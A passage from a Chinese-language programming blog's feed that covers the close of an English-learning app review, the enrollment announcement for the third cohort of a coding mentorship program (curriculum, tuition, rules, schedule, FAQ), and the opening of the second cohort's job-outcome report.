src="/img/voicetube-hero-review-9409c2248845/1__3xndo8fPG9U8Q1FgWXH8Rw.png"></p><h3 id="從課程機制中學習"><a href="#從課程機制中學習" class="headerlink" title="從課程機制中學習"></a>從課程機制中學習</h3><p>開頭我有提過了，可以從這套系統試圖找到一些教學的靈感，而我覺得他們有幾個點是我可以學習的。</p><p>第一個是獎勵及等級機制，在答完題目之後其實會給你經驗值，然後經驗值可以用來升等。感覺就像是遊戲那樣，雖然經驗值其實沒什麼用，但是對於數據控之類的可能就會想要一直升級。像是 Google Map 的等級其實也沒什麼太大用途，但我還是偶爾會去練等，而且有勳章可以拿很帥！</p><p>第二個是日曆的課表安排以及複習，在介面上你可以看到這樣一個日曆：</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__Mcvnqhiu5DXESNBZe5Yf8w.png"></p><p>上面會自己幫你排課表，還會幫你設定目標，當然這也是自己可以調整的。</p><p>其實複習真的是一件很重要的事，只要花點時間複習個兩三次，其實內容差不多就完全記住了，但複習最難的一點就是「你要記得複習」，而這個日曆就解決了這個問題，該上課的時候也會寄 Email 來給你。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>整體來說，其實我覺得是一套不錯的學習系統，而且規劃滿完整的。藉由看影片來學英文不會讓學習變得枯燥，而不同的題型也可以讓你不會覺得無聊，其中我最喜歡的題型則是聽打，畢竟我英文聽力不是很好。</p><p>若是能夠三十天堅持不懈，每天都靠著這套系統看影片學英文的話，我覺得英文程度應該是能進步滿多的。</p><p>其實這套系統還有一些地方我沒介紹到，但主要功能我差不多都講了，剩下的就交給大家自己去發掘，畢竟什麼都講的話就變成說明書而不是心得文了。</p><p>最後跟大家分享兩個活動訊息，第一個是全新 VoiceTube Hero 零元挑戰，基本上就是符合一些條件（天天上課之類的），就能夠全額退費！滿適合有毅力的人報名參加，又可以學英文又不用錢，聽起來挺不錯的。可以用我的 9 折優惠碼 huli 或者是點這個連結：<a href="https://bit.ly/2SfPje4">https://bit.ly/2SfPje4</a></p><p>覺得自己辦不到的人其實很推薦試試看，因為根據我在<a href="/2018/09/26/procrastination-ba12754ada49/">《致跟我一樣的拖延症患者：動力是需要刻意創造的》</a>裡面的說法，這樣子的挑戰能夠刻意幫自己創造動力，為了省下那幾千塊，我相信大家都很願意完成挑戰。</p><p>再來是 10&#x2F;14（三）起，只要推薦朋友加入 Hero 課程，朋友可享限時 85 折優惠，你可以領 500 元現金，最高可以領到 20000 元！有興趣的話可以點這裡：<a href="https://bit.ly/3iDTECJ">https://bit.ly/3iDTECJ</a></p><p>大概就是這樣啦，祝大家學英文愉快。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大改版：程式導師實驗計畫第三期報名簡章</title>
      <link href="/2019/03/14/mentor-program-3rd-47a2e85e33b3/"/>
      <url>/2019/03/14/mentor-program-3rd-47a2e85e33b3/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mentor-program-3rd-47a2e85e33b3/0__ubNN8PSJzswnZbvw.jpg"></p><p>雖然每一期都說要慎重考慮要不要做下一期，但最後都還是做了。這是我強迫自己不要偷懶的一種方式。如果你覺得這件事情你可能做不來、可能拖延症會發作，就先說你要做就對了，剩下的問題你自己會幫自己搞定。</p><p>如果你只是剛好路過點進來或是朋友丟個連結你就點進來了，完全不知道這計畫是什麼碗糕，請你務必把前兩期的一些資料看過，我希望你能了解這計劃在幹嘛，以及前兩期的成效如何，再來決定要不要報名。</p><ol><li><a href="/2019/03/13/mentor-program-2nd-result-3cb7c2b6627e/">27% 的人找到工作 — — 程式導師實驗計畫第二期成果報吿</a></li><li><a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">四個月過去了，來找我學程式的學生們怎麼樣了？</a></li><li><a href="/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/">這是一堂沒那麼適合初學者的課程 — — 程式導師實驗計畫第二期期中反思</a></li><li><a href="/2018/07/12/mentor-program-s2-f876c4e13d3b/">程式導師實驗計畫第二期報名簡章</a></li><li><a href="/2018/06/26/mentor-program-review-a9c6668dfb/">程式導師實驗計畫第一期成果與心得</a></li><li><a href="/2017/12/21/mentor-program-b5f96ae1eed1/">從零到一：程式導師實驗計畫</a></li></ol><p>雖然看完上面這些資料，你應該對我有點理解了，但我還是不免俗地再自我介紹一次。</p><p>我是胡立，學程式十幾年，工作經歷三年半，喜歡教學，目標是不斷改進教學內容，直到證明自己的教學是最強的（儘管那天可能永遠都不會到來）。現在在新加坡某間新創擔任 Front-end team lead，但下個月要離職了，五月開始會周遊列國直到年底。</p><p>對，你沒看錯，我五月要開始四處漂泊了，但我依然開了第三期，這個等一下會解釋。</p><h3 id="計畫詳情"><a href="#計畫詳情" class="headerlink" title="計畫詳情"></a>計畫詳情</h3><p>這個計畫很簡單，目標就是：</p><blockquote><p>六個月內，把你培養成一個找得到工作的網頁工程師（前端或後端）</p></blockquote><p>六個月過後，你可以學到以下東西：</p><ol><li>基本 Git 操作</li><li>基本 command line 操作</li><li>前端基礎（HTML, CSS, JavaScript）</li><li>前端各種工具運用及原理（jQuery, SCSS, Gulp, Webpack）</li><li>前端進階（React, Redux）</li><li>後端基礎（PHP, Node.js, MySQL）</li><li>後端進階（CodeIgniter, Express）</li><li>基本網路安全（XSS, SQL Injection, CSRF, 密碼不能存明碼）</li><li>部署（買 domain, 設定 DNS, 租 Digital Ocean 主機, 自己架環境）</li></ol><p>上面比較像是工具層面可以學到的東西，但除了工具以外，其實這門課程更在乎的是原理與基礎。</p><p>以六個月來說，其實這門課程教的東西很多了，所以你必須付出一定的時間（每週 40 小時以上），才有辦法在結業時成為一名基礎紮實的工程師。</p><p>因為我本身是偏前端，所以前兩期連帶影響到學生，他們都比較想走前端。但是以課程內容來說，你想走後端也是可以的。前後端比重我覺得大概是 65 : 35，前端還是會多一些。</p><p>另外，根據上一期學生的回饋，若是你零基礎又對程式比較沒有概念，很有可能會跟不上課程。雖然這期課綱有做調整，但我不知道成效會如何，這點之後會細講。</p><p>這邊是第三期的課程大綱：<a href="https://github.com/Lidemy/mentor-program-3rd">https://github.com/Lidemy/mentor-program-3rd</a>，如果你有朋友是工程師的話，可以請他幫你鑑定看看這樣的課綱如何。</p><p>底下是這一期的圖片版大綱，特別感謝 <a href="https://medium.com/u/413f2224faed">TsuiFei Pommier</a> 幫忙做圖。不過這邊都是比較偏工具類的，更多基礎跟原理看上面 GitHub 的大綱會詳細很多。</p><p><img src="/img/mentor-program-3rd-47a2e85e33b3/1__1G3ouBYBmScXR7hB92iSwg.png"></p><h3 id="教學方式"><a href="#教學方式" class="headerlink" title="教學方式"></a>教學方式</h3><p>這一期跟前兩期最大的不同在於：</p><blockquote><p>直播全部取消，只留下線上課程並加上導讀</p></blockquote><p>最主要的原因我開頭說過了，我五月開始會周遊列國，所以不曉得當地網路環境如何，設備也不夠好，沒辦法穩定的提供直播。</p><p>再來的話是直播的幫助其實不是那麼大。線上課程的影片可以快轉、跳著看，而且會切成一個個小的影片，對學習是比較有幫助的。因此第三期的課程內容全部是線上影片，也會提供前兩期的直播存檔。</p><p>除此之外呢，每一週都會有一個導讀影片，先帶大家看一下這一週要學的東西是什麼，以及為什麼要學這些的原因。先有一個概觀，在實際進入課程時才比較有個心安的感覺。</p><p>而這個課程最受好評的部分：<strong>改作業以及回答問題</strong>還是會有。但速度可能會慢了一些，而且若是有什麼不可抗力之因素可能會短暫暫停（例如說我住的地方沒網路，或是我電腦壞了之類的）。</p><p>這次出國流浪的旅途中我都會帶著電腦，晚上沒事做的時候就會來改改作業當作休閒娛樂。晚上我通常都沒什麼事做，所以不用擔心作業沒人改。群裡也會有上一期的學生跟我找進來的一些小幫手們，他們也會回答你的問題。</p><p>再次總結一下這次的教學方式：</p><ol><li>有明確的課綱讓你跟著走</li><li>每一週都會有導讀影片</li><li>「大部分」教學內容都會有搭配的線上影片，沒有的要自己去尋找相關資源</li><li>會幫你改作業跟回答問題</li></ol><p>跟上一期不同的地方在於：</p><ol><li>上一期是採每週直播來上課，這一期是直接錄好影片</li><li>上一期改作業跟回答問題速度會比較快，這一期比較慢</li></ol><h3 id="收費方式與課程制度"><a href="#收費方式與課程制度" class="headerlink" title="收費方式與課程制度"></a>收費方式與課程制度</h3><p>大致上都與第二期相同，以下簡單敘述一下。</p><h4 id="淘汰制"><a href="#淘汰制" class="headerlink" title="淘汰制"></a>淘汰制</h4><p>每兩週淘汰一次人，被淘汰的人不會退費，會被迫離開這個計畫，淘汰標準為同時滿足下列兩個條件：</p><ol><li>兩週內每日進度報告累積缺交三次（假日除外，就簡單講一下自己昨天做什麼、今天要做什麼）</li><li>連續兩週未交作業</li></ol><p>不過這期我要加一個但書，儘管沒有同時滿足以上兩個條件，但我完全看不出來你在跟課的話，我也會直接把你淘汰掉。</p><p>會有這條但書是因為第二期有些人有滿足條件，但我實在不知道他們的進度如何以及到底有沒有在跟課，可是礙於規則又沒辦法淘汰，所以這一期新增了這條但書。但放心，要被我淘汰掉也沒有那麼容易。</p><h4 id="收費方式"><a href="#收費方式" class="headerlink" title="收費方式"></a>收費方式</h4><blockquote><p>開課後兩個月內不用付任何錢，當開課滿兩個月後決定要繼續上課的話，請付 5000 元新台幣保證金，之後若被淘汰掉錢也不會退給你。</p></blockquote><blockquote><p>在結業後兩個月內找到工作的話，學費總額是一個半月的薪水；沒找到工作的話費用全免，我連 5000 塊一起退給你。</p></blockquote><p>簡單來說有分成幾種情況：</p><ol><li>上了兩個月發現課程很爛不想上 &#x3D;&gt; 無損失</li><li>上了兩個月繳了 5000 元後來被淘汰 &#x3D;&gt; 損失新台幣 5000 元</li><li>跟完課程找到工作 &#x3D;&gt; 一個半月薪水</li><li>跟完課程沒找到工作 &#x3D;&gt; 幾乎無損失</li></ol><p>這邊薪水的計算方式跟第二期不同了，以前是以<strong>你拿到最高薪的 offer</strong> 為主，這一期改成<strong>以你最後接受的 offer</strong> 為主。假設你拿了兩個 offer，45k 跟 40k，最後去了 40k 的，學費就是 40k *1.5 &#x3D; 60k。</p><p>會這樣調整的原因很簡單，我希望學生選擇自己喜歡的那個，而不一定是最高薪的那個。在以往，假設學生拿到兩個 offer，45k 跟 40k，在無論如何學費都是以 45k 來計算的情況下，選 40k 的似乎損失會更多，但最後選 offer 時薪水不應該是唯一考量，應該把環境、發展狀況以及個人喜好都涵蓋進去，因此我不希望學費的計算方式助長了以薪水為最高指標的風氣。</p><p>再者，之前這樣收其實是擔心有人為了想少繳一點學費，於是選薪水比較低的，但我後來發現根本就是白擔憂了。因為這樣算起來一點都不划算，而且我跟學生之間也有一定程度的信任關係，不用擔心這種事。</p><p>另外有一種特例是拿到 offer 但最後沒去上班，這種的話會比照第二期，以最高薪的 offer 為基礎來計算學費。沒去上班也要收學費的原因是：拿到 offer 代表你有實力，但最後去不去是你的選擇。我只針對你培養出來的實力收學費，跟你個人選擇去不去無關。</p><p>以第二期來說，有找到工作的人平均薪水大概是 41k 左右，大部分的人薪水都落在 40k~45k 這個區間。</p><p>然後本期依舊有工程師加強班，歡迎已經是工程師的人來報名，一樣是用同一套課程。</p><p>收費方式為：</p><blockquote><p>開課後兩個月內不用付任何錢，當開課滿兩個月後決定要繼續上課的話，請付 5000 元保證金，之後若被淘汰掉錢也不會退給你。（這邊都一樣）</p></blockquote><blockquote><p>在上課滿三個月時如果還想繼續上，請付新台幣三萬五千元，接下來就沒有淘汰制度了，但你覺得課程不滿意想退出也不能退費。</p></blockquote><p>前半段都跟零基礎班的一樣，兩個月內不用付錢、兩個月時繳不會退還的 5000 保證金，上了三個月如果還想上，再額外付三萬五千元（因此學費總和為 40000 元台幣，比第二期貴了一萬），接著工程師加強班就不會淘汰人了，但之後的課程若不滿意也無法退費。</p><p>兩個班的學費都可以零利率分期付款，我這邊很 free 的。所以不用怕一找到工作我就跟你要六萬或更多，工程師班的四萬也可以零利率分期付款。</p><h3 id="報名資格"><a href="#報名資格" class="headerlink" title="報名資格"></a>報名資格</h3><p>1. 一個禮拜可以拿出 40 個小時左右的人（不然你很有可能會被淘汰，或者是課程進度嚴重落後）</p><p>2. 想要轉職成工程師的人（如果只是想學一些程式技能，沒有想要找工作的話不開放報名）</p><p>3. 結業後有求職意願的人（基本上不開放學生報名，因為學生結業之後可能礙於兵役或是要繼續升學而不會去求職，會讓我沒辦法衡量計畫的成效，但如果你確定你結業後可以去求職，那 ok）</p><p>再次強調，原則上不開放學生報名，除非你結業完可以去找「正職工作」，或者若是你有一個強力的理由可以說服我讓你參加，我就把你拉進來旁聽。</p><p><strong>附註：</strong>以上條件不適用於工程師加強班，加強班已經是工程師了所以速度應該會快上不少，一週大概拿出個 20 小時左右即可，依照個人能力調整。</p><h3 id="跟第二期有哪些不同"><a href="#跟第二期有哪些不同" class="headerlink" title="跟第二期有哪些不同"></a>跟第二期有哪些不同</h3><p>第一，時間拉長，原本是四個月學習，六個月內找到工作；這期變成六個月學習，八個月內找到工作（如果你本身基礎就很好，覺得課程太慢，可以自己按照進度走，不一定要侷限在六個月完成課程）。</p><p>第二，我自己對學生的期望待遇拉高，上一期跟大家說是 35k<del>45k，這期我希望是 40k</del>50k。（不知道野心會不會太大，但管他的，先試了就知道）</p><p>第三，直播取消，改成看線上課程影片。</p><p>第四，這期更強調心得筆記，會要寫很多東西（不強迫，但強烈建議）</p><p>第五，價格調漲了一些，保證金變 5000 元，工程師班從三萬變四萬</p><p>第六，原本是上一個月的課付錢，因為這次課綱跟上課方式改動太大，所以調整為兩個月才要付保證金。</p><p>第七，學費計算方式從最高薪的 offer 轉變成最後接受的 offer 為主。</p><h3 id="這門課適合怎樣的人"><a href="#這門課適合怎樣的人" class="headerlink" title="這門課適合怎樣的人"></a>這門課適合怎樣的人</h3><p>強烈建議你在報名之前先把<a href="https://github.com/Lidemy/mentor-program-2nd/issues">上一期所有學生的心得</a>都掃過一遍，看看哪一個跟你的背景比較像一點，得到的解答會比較準確。每一個人的心得都很值得參考，我希望來報名的學生能盡可能理解這個課程的過去，也看過之前學生對這堂課的心得，覺得適合自己才來報名。</p><p>而根據前兩期的結果，這門課程最適合的對象是：</p><blockquote><p>有程式基礎、學過一點程式，可是不知道怎麼踏入網頁前後端的領域，東西太多了不知道怎麼學的人</p></blockquote><p>這種人來這邊的話，只要課程有跟完，能夠成功轉職的機率頗高的。若是你覺得六個月太久，也可以按照自己的進度調整，不會硬要把你綁在主進度上面。</p><p>可是這不是我最想教的人，我最想教的還是什麼程式基礎都沒有的白紙。在第二期的時候我失敗了，我沒辦法讓他們在六個月變成工程師，但我願意一直試著往這個方向走。</p><p>因此，無論你是什麼樣的背景，你都可以報名。</p><p>但如果你真的一點基礎都沒有，而且覺得自己從小數理邏輯之類的就很差，那在報名前你必須有一個心理準備，就是六個月後可能還沒辦法成為工程師。請你一定要做好這個心理準備。</p><p>在開始前就有這種心理準備，會讓你之後的學習歷程愉悅很多。但儘管如此，你依然可以學到課程裡面大部分的東西，並且開啟你的程式生涯，我認為依舊是很有幫助的。</p><h3 id="計畫時程表"><a href="#計畫時程表" class="headerlink" title="計畫時程表"></a>計畫時程表</h3><p>報名日期：即日起至 2019&#x2F;04&#x2F;07 晚上 11:59 分（日）（已截止）<br>報名結果公告：2019&#x2F;04&#x2F;10（三）<br>開課日期：2019&#x2F;04&#x2F;15（一）<br>繳交保證金新台幣 5000 元（兩個月）：2019&#x2F;06&#x2F;15（六）<br>繳交學費 35000 元（三個月，工程師加強班才有的）：2019&#x2F;07&#x2F;15（一）<br>結業日期：2019&#x2F;10&#x2F;15（二）<br>求職截止日（在這時間點前找到工作都必須付學費）：2019&#x2F;12&#x2F;15（日）</p><p>更新：已截止報名</p><h3 id="報名方式"><a href="#報名方式" class="headerlink" title="報名方式"></a>報名方式</h3><ol><li>填寫 <a href="https://goo.gl/forms/xU0RNtZ0eIWRFAe42">Google 表單</a>（一些基本資料）</li><li>去研究什麼是 <a href="https://scratch.mit.edu/">Scratch</a>，並且做出一個小作品，只要是任何你覺得完整的作品就好，沒有 idea 的話可以參考 CS50。這個只是想測驗你有基本的自學能力而已，所以不用做得太複雜（不用有關卡）</li><li><a href="https://www.codewars.com/">Codewar</a> 是一個程式解題的平台，請參考<a href="https://github.com/Lidemy/mentor-program/blob/master/codewar.md">這篇</a>並解出這篇裡面任意三個題目，解完以後請寫一篇解題的心得（例如說如何從什麼都不會到了解什麼是迴圈，或者是解題的時候卡關的地方等等）</li></ol><p>（根據前人的經驗，沒有任何程式基礎的話上課會上的很趕很趕，所以強烈建議你在報名前自己先預習很基礎的程式知識。如果你毫無程式基礎，可參考 codecademy 或任何網站先預習 JavaScript）</p><p>上面三個都做完之後，請寫信到：<a href="mailto:&#x61;&#x73;&#122;&#x78;&#x38;&#55;&#x34;&#x31;&#48;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x61;&#x73;&#122;&#x78;&#x38;&#55;&#x34;&#x31;&#48;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;</a></p><p>標題請打：[報名] 程式導師實驗計畫第三期 — huli</p><p>（請把 huli 換成你自己的暱稱）</p><p>內文麻煩附上：</p><ol><li>自我介紹（讓我更瞭解你）</li><li>報名這個計畫的理由</li><li>若成功錄取之後，你的時間安排為何（例如說目前待業，每天都有 8 小時可以寫程式；或是目前在職，但是晚上七點到十點會自學等等）</li><li>你未來想做什麼？（純粹好奇而已，回答前可以參考<a href="https://www.facebook.com/chouchinhua/posts/10155380530346697">這一篇</a>）</li><li>平時有寫東西的習慣嗎？（像是部落格、讀書心得、電影心得或者是旅遊日記都可以，有的話可以多談談這部分或附上網址，沒有的話也沒關係）</li><li>Scratch 作品連結</li><li>做完 Scratch 作品的心得</li><li>Codewar 帳號</li><li>解 Codewar 題目的心得</li><li>任何你想跟我分享的東西（例如說你寫的小說、你畫的圖、你的一篇廢文等等。）</li><li>目前的工作內容、狀況以及在工作上碰到的困難（工程師加強班才需要回答）</li></ol><p>收到信件之後大概兩三天內我會回覆一個罐頭回信，讓你知道我有收到了。若是你過一週都沒收到回信，麻煩請私訊粉絲團詢問。請記得，Google 表單填完跟寄信之後才算是報名成功，兩者缺一不可。</p><p>報名結果公告那天（2019&#x2F;04&#x2F;10），無論有沒有錄取你都會收到信件，絕對不會有無聲卡的情形發生。</p><p>總而言之，我會讓你知道我收到報名信了，也會讓你知道你有沒有錄取。（但是沒錄取的通知信有可能是罐頭信件就是了，不好意思）</p><p>在填寫報名表前強烈建議可參考：<a href="/2018/08/19/mentor-program-register-3648c1b82cd7/">如何決定錄取與否？對計畫的反思以及對報名信的建議</a>。</p><h3 id="廠商合作專區"><a href="#廠商合作專區" class="headerlink" title="廠商合作專區"></a>廠商合作專區</h3><p>第二期的學生出去面試之後發現有滿多公司都對這個計畫滿感興趣的，第二期還有大概四五個學生還在學習，應該再一兩個月能夠出去求職，若是你對這些學生有興趣的話，可以直接寫信給我：<a href="mailto:&#97;&#x73;&#x7a;&#120;&#x38;&#x37;&#52;&#x31;&#48;&#64;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#97;&#x73;&#x7a;&#120;&#x38;&#x37;&#52;&#x31;&#48;&#64;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a>。</p><h3 id="常見問題"><a href="#常見問題" class="headerlink" title="常見問題"></a>常見問題</h3><h4 id="Q-為什麼這個計畫到了第三期還是「實驗」計畫"><a href="#Q-為什麼這個計畫到了第三期還是「實驗」計畫" class="headerlink" title="Q: 為什麼這個計畫到了第三期還是「實驗」計畫"></a>Q: 為什麼這個計畫到了第三期還是「實驗」計畫</h4><p>這個計畫搞不好永遠都會叫做「實驗」計畫，因為每一期我都當作一個實驗，實驗我的教學成效如何、品質如何，根據學生的回饋調整課程內容，繼續做下一輪的實驗，持續優化、改進。</p><h4 id="Q-為什麼我要花這麼多錢只為了看線上影片"><a href="#Q-為什麼我要花這麼多錢只為了看線上影片" class="headerlink" title="Q: 為什麼我要花這麼多錢只為了看線上影片"></a>Q: 為什麼我要花這麼多錢只為了看線上影片</h4><p>第一，你沒找到工作的話不用付錢，所以沒差；你找到工作的話，你的目的就達成了，看不看線上影片也不是重點了。</p><p>第二，這些影片沒有公開賣（但未來可能會拆開來賣），所以外面看不到。</p><p>第三，線上影片其實各有優缺點，我認為優點是更明顯的。聽我直播上課你可能會睡著或是嫌太慢，但是影片可以快轉，你也可以上課到一半先去看個反骨男孩再回來看教學。</p><h4 id="Q-為什麼課程裡前後端都有而不是只專注在一個？兩邊都學會不會樣樣通樣樣鬆？"><a href="#Q-為什麼課程裡前後端都有而不是只專注在一個？兩邊都學會不會樣樣通樣樣鬆？" class="headerlink" title="Q: 為什麼課程裡前後端都有而不是只專注在一個？兩邊都學會不會樣樣通樣樣鬆？"></a>Q: 為什麼課程裡前後端都有而不是只專注在一個？兩邊都學會不會樣樣通樣樣鬆？</h4><p>首先，讓你前後端都學絕對不是讓你成為 Full-stack 工程師，成為 <a href="https://ithelp.ithome.com.tw/users/20091346/ironman/1150">Half-stack</a> 倒是有點機會。</p><p>無論你是前端還是後端，別忘了前面還有大家經常性忽略的一個詞「Web」，Web 前端與後端才是全名。</p><p>既然 Web 包含了前後端兩個部分，少了任何一部份都不完整，都會讓你對於整個網路的理解缺了一塊。因此這堂課從前到後再由後到前，希望把你對網路的知識整個打通，這樣我覺得才是最完整、最全面的學習。</p><p>至於樣樣通樣樣鬆，不會。</p><p>一併學習前後端的好處就是對網路的基礎會比只學單個的紮實許多，因為你對整體有個全面性的理解。而且這邊前後端都注重原理與基礎，基礎打好之後學工具便不是難事。</p><h4 id="Q-是不是不用學這麼多也能找到工作？"><a href="#Q-是不是不用學這麼多也能找到工作？" class="headerlink" title="Q: 是不是不用學這麼多也能找到工作？"></a>Q: 是不是不用學這麼多也能找到工作？</h4><p>是，其實有些東西不影響求職，若是完全以求職為目標其實可以拔掉，但是我想做的不僅於此。</p><p>除了培養出工程師，我還想培養出好的工程師、基礎穩固的工程師。所以這堂課大概七八成的部分都在打底，前後端框架一直到第 20 週，課程上了五個月以後才出現。</p><p>我認為這才是學框架最好的時機。在這以前學的話基礎不穩，或許可以找到一些不注重基礎的公司，但基礎之所以是基礎，就因為你遲早有一天要補起來，這是逃不掉的。</p><p>與其要補的時候不知道從何開始，不如一開始就把這一段弄好，之後就算不想當網頁工程師也沒關係，穩固的基礎可以讓你做什麼都比別人順利。</p><h4 id="Q-為什麼這一期的時間變長了？-學習時間從四個月變六個月"><a href="#Q-為什麼這一期的時間變長了？-學習時間從四個月變六個月" class="headerlink" title="Q: 為什麼這一期的時間變長了？ 學習時間從四個月變六個月"></a>Q: 為什麼這一期的時間變長了？ 學習時間從四個月變六個月</h4><p>根據之前的回饋，對完全沒有碰過程式也比較沒有這方面天份的人來說，四個月是完全不夠的，因此這一期加長到六個月。針對進度快的同學也會額外提供一些挑戰，把他們的基礎練得更好。</p><p>若是你本身基礎就不錯，覺得課程進度太緩慢，你也可以自己超前進度，這都是沒問題的。主進度只是一個「建議值」，這建議值是給初學者看的，我不會把人綁在某一個進度上不讓你前進，你想前進就自己前進，這都 OK。</p><p>我希望大家都可以跟得上，我希望出來的人基礎可以很紮實。雖然很多人都期望速成，但我覺得六個月其實已經很速了，畢竟課程裡面教的東西大概是我花了五六年自學，整理吸收之後才得到的成果。</p><h4 id="Q-時間拉長之後，對於進度比較快的學生該怎麼辦？"><a href="#Q-時間拉長之後，對於進度比較快的學生該怎麼辦？" class="headerlink" title="Q: 時間拉長之後，對於進度比較快的學生該怎麼辦？"></a>Q: 時間拉長之後，對於進度比較快的學生該怎麼辦？</h4><p>對於進度較快的學生，有兩個解法。</p><p>第一個是先往下學，超越進度。第二個是每一週的作業都會提供挑戰題跟超級挑戰題，如果覺得當週課程太簡單，可以試著寫寫看這兩道題目。</p><h4 id="Q-學生出來會不會沒人帶就什麼都不會？"><a href="#Q-學生出來會不會沒人帶就什麼都不會？" class="headerlink" title="Q: 學生出來會不會沒人帶就什麼都不會？"></a>Q: 學生出來會不會沒人帶就什麼都不會？</h4><p>首先，大家要很清楚知道的一點是，在職場上沒人帶才是常態。很有可能你進去的公司只有你一個工程師，或是儘管有一個 team，但也不會有一個人專門去帶你。本來就沒有人有義務去帶你。</p><p>為了不讓學生變成只會看影片跟著打 code ，關了影片什麼都寫不出來的那種人，我在作業上有做一些調整，很多作業的內容跟要你寫的東西是課程裡面沒有的，你就必須自己去找資料才能實作得出來。</p><p>所以在課程中就已經培養了一定程度的自學能力。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>27% 的人找到工作——程式導師實驗計畫第二期成果報吿</title>
      <link href="/2019/03/13/mentor-program-2nd-result-3cb7c2b6627e/"/>
      <url>/2019/03/13/mentor-program-2nd-result-3cb7c2b6627e/</url>
      
        <content type="html"><![CDATA[<p>兩個月前我 po 了這篇：<a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">四個月過去了，來找我學程式的學生們怎麼樣了？</a></p><p>那時跟大家簡短報告一下從計畫開始後四個月的狀況，並承諾會在 3&#x2F;14 計劃正式結束時給大家一個完整的成果報告。</p><p>現在是 3&#x2F;13 的晚上，我來兌現承諾了。</p><h3 id="學生狀況"><a href="#學生狀況" class="headerlink" title="學生狀況"></a>學生狀況</h3><p>你可以在<a href="https://docs.google.com/spreadsheets/d/1-yuiwdubomd-q9S6oGTbje9QZG4bJW84vWcUqOcnz58/edit?usp=sharing">這裡</a>看到學生完整的出缺勤以及交作業的狀況，跟預想中的差不多，課程後期的數據慢慢開始往下掉，過完年後除了正在找工作的同學以外，其他只剩少數三四位同學還在繼續前進（或者還有另一個可能，他們自己還在繼續學只是沒有 po 進度報告讓我知道）。</p><p>這也滿正常的，儘管教材都在那邊，但一來年假放了太久，動力很難再找回來；二來教的部分結束了，所以進度在後面的同學其實就有種整個課程結束了的感覺，是我的話我也會懶病發作，懶得繼續自己往下學。</p><p>再來，直接來談談大家最想知道的就業狀況。</p><p>原本課程開始時有 38 人，淘汰 2 人後剩 36 人，扣掉工程師班的 3 人以後剩 33 人，再扣掉狀況不明的 F 班 4 人，剩下 29 人。因此以下會出現的比例都是以分母當作 29 來計算。</p><p>上一篇文章跟大家說與估計大約能有 13 人（45%）能夠在 3&#x2F;14 以前順利找到工作，但最後的結果是 8 人（27%），跟之前預估的數字比起來掉了頗多。</p><p>有兩個同學有拿到 offer 但是內容滿慘的，一個在台中拿 26k，一個在台北拿 30k~35k 左右，這兩個我都跟他們說可以繼續再找，因此沒有把他們列在找到工作的名單中，而是歸類在轉職失敗的那一群。</p><p>找到工作的時間點因人而異，而且差別滿大的，從最早的十二月底（課程開始後四個月）到一月中（四個半月）再到二月中（五個半月）都有。</p><p>學生拿到的最高月薪的 offer 我直接寫在下面（有些是 12 個月有些是 14 個月，換算下來其實影響滿大，但如果把這個列入考慮的話會複雜很多，因此只能先忽略不計），職缺幾乎都為前端工程師：</p><p>45k ：2 人<br>44k：1 人<br>42k ：1 人<br>40k：3 人<br>36k：1 人</p><p>平均算起來沒什麼意義我就不算了，但區間大都落在 40k~45k 裡面。而每個人也大概都拿了三四個 offer 左右，最後選的不一定是薪水最高的。</p><p>至於求職花的時間，有人面試的第一間就錄取了，後來也去報到了。不過這當然是特例，只是覺得太特別了所以提出來講一下。大部分的人大概都花了兩週到一個月左右，應該算是滿順利的。</p><p>順帶一提，有兩個第一期的同學也順利找到了工作，其中一個還進了一間我自己覺得非常不錯的公司。</p><h3 id="學生回饋"><a href="#學生回饋" class="headerlink" title="學生回饋"></a>學生回饋</h3><p>在期末的時候我有發了個表單請大家填一下，直接先上圖：</p><p><img src="/img/mentor-program-2nd-result-3cb7c2b6627e/1__qdwRZ0X4d3xowKB9C__lq3A.png"></p><p>而學生認為這個計畫幫助最大的地方有兩個：</p><ol><li>明確的課程目標跟大綱</li><li>改作業</li></ol><p>若是你想看學生自己寫的心得，我全都放在這了：<a href="https://github.com/Lidemy/mentor-program-2nd/issues">程式導師實驗計畫第二期心得</a>。</p><p>心得基本上分成四類：</p><ol><li>第一期後來找到工作的學生</li><li>工程師加強班</li><li>第二期有找到工作的</li><li>第二期沒轉職成功的</li></ol><p>每一篇心得其實都不會太長，都是學生以第一人稱的角度寫完之後交給我的，我再貼上去。內容沒有限制也沒有刪減，他們給我什麼我就貼什麼。</p><p>不過倒是有給了一個大綱，跟他們說若是沒有靈感的話可以照著大綱寫，我給的大綱長這樣：</p><ol><li>課程開始前的心得以及對於課程的期待</li><li>課程開始一段時間（例如說一兩個月）後的心得，跟原本的期待有哪些差異？優缺點在哪？</li><li>課程卡關後（就是大家都卡關那時期）的心得</li><li>面試時的心得，課程有給了你哪些幫助？如果可以的話希望還能獲得哪方面的幫助？</li><li>總結一下整個課程的心得感想，像是修完之後跟原本的期待是否有出入，是否推薦其他人參與課程，優點與缺點等等的</li></ol><p>若是有時間的話，很推薦大家把所有心得都看一看。如果沒時間的話，可以先看<a href="https://github.com/Lidemy/mentor-program-2nd/issues?q=is:open+is:issue+label:%E8%BD%89%E8%81%B7%E5%A4%B1%E6%95%97">轉職失敗</a>的心得，因為這類心得在其他地方幾乎都看不到。</p><p>如果你真的很沒時間，可以先看這兩篇最完整的：</p><ol><li><a href="https://github.com/Lidemy/mentor-program-2nd/issues/25">學生心得：yuting（轉職失敗）</a></li><li><a 